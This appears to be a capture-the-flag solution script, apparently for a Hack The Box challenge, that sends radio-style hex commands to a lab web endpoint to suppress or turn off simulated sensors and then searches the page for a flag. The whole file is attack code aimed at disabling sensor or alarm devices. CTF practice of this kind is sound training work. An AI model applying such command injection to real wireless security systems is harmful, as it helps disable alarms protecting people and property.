#!/usr/bin/env python3
import requests
import time

base_url = 'http://94.237.53.81:59575'
s = requests.Session()
s.get(base_url)

# Probar diferentes formatos
test_cases = [
    # Solo comandos sin dirección ni CRC
    {'desc': 'Solo comandos F1 y FF', 'msg': 'F1F1F1F1FFFFFF'},
    # Solo direcciones + comandos sin CRC
    {'desc': 'Addr+Cmd sin CRC', 'msg': 'A1F1A2F1A3F1A4F1E1FFE2FFE3FF'},
    # Broadcast a todos
    {'desc': 'Broadcast 0x03', 'msg': '03030303030303'},
    # Solo suprimir
    {'desc': 'Solo Suppress', 'msg': 'F1'},
    # Solo apagar
    {'desc': 'Solo Turn Off', 'msg': 'FF'},
]

for test in test_cases:
    print(f"\n[*] Probando: {test['desc']}")
    print(f"    MSG: {test['msg']}")
    
    r = s.post(f'{base_url}/transmit', data={
        'freq': '433.92',
        'mod': 'ASK',
        'bits': '1',
        'msg': test['msg']
    })
    
    time.sleep(2)
    
    # Verificar estado
    r = s.get(base_url)
    
    # Buscar cambios en los sensores
    if 'text-danger' in r.text:  # Rojo = apagado/error
        print("    [+] ¡Cambio detectado! (text-danger)")
    elif 'text-secondary' in r.text:  # Gris = inactivo
        print("    [+] ¡Cambio detectado! (text-secondary)")  
    else:
        print("    [-] Sin cambios visibles")
    
    # Buscar flag
    import re
    flags = re.findall(r'HTB\{[^}]+\}', r.text)
    if flags:
        print(f"\n{'='*60}")
        print("[SUCCESS] FLAG ENCONTRADA!")
        print(f"{'='*60}")
        for flag in flags:
            print(flag)
        print(f"{'='*60}")
        break
